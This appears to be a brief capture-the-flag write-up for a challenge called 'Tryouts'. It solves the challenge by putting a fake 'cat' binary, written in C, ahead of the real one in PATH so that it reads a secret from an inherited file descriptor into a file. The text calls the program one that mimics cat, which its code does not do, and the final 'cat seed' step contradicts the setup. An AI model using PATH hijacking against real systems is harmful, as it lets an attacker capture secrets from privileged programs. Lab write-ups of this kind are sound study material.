## Tryouts 

 - Write a simple C program (e.g., cat.c) in your home directory that mimics the behavior of the "cat" command:
``` 
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[]) {
    int fd = open(argv[1], O_WRONLY | O_CREAT, 0644);
    char buf[16];
    read(3, buf, sizeof(buf));
    write(fd, buf, sizeof(buf));
    close(fd);
    return 0;
}
```

 - Create a file named `seed` in your home directory
 - Add your home directory to the PATH environment variable.
 ```
 export PATH=$HOME:$PATH
```

 - Execute the tryouts executable in its folder.

 -  Use the `cat seed` to read the file. The solution will be revealed.

 This approach leverages a fake "cat" command to intercept the solution and demonstrates how manipulating the PATH can influence command execution.
